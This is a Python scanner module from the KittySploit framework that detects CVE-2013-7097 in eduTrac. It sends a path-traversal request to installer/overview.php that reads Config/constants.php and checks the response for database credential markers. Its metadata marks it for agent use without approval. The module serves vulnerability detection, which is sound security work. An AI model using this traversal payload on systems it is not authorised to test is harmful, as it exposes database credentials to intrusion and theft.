#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""eduTrac installer overview.php path traversal (CVE-2013-7097)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'eduTrac - overview.php LFI Detection (CVE-2013-7097)',
        'description': (
            'Detects CVE-2013-7097 by requesting installer/overview.php?showmask= '
            'traversal to Config/constants.php and matching DB_* markers.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'edutrac', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.8,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-7097',
        ],
        'cve': 'CVE-2013-7097',
    }

    def run(self):
        for base in ('/eduTrac', '/trac', ''):
            probe = self.http_request(method='GET', path=f'{base}/index.php', allow_redirects=False)
            if not probe or 'eduTrac' not in (probe.text or ''):
                continue
            path = (
                f'{base}/installer/overview.php?step=writeconfig'
                '&showmask=../../eduTrac/Config/constants.php'
            )
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r:
                continue
            body = r.text or ''
            if "DB_PASS', '" in body and "DB_USER', '" in body and "DB_NAME', '" in body:
                self.set_info(
                    severity='high',
                    reason='eduTrac overview.php LFI (CVE-2013-7097)',
                    path=f'{base}/installer/overview.php',
                )
                return True
        return False
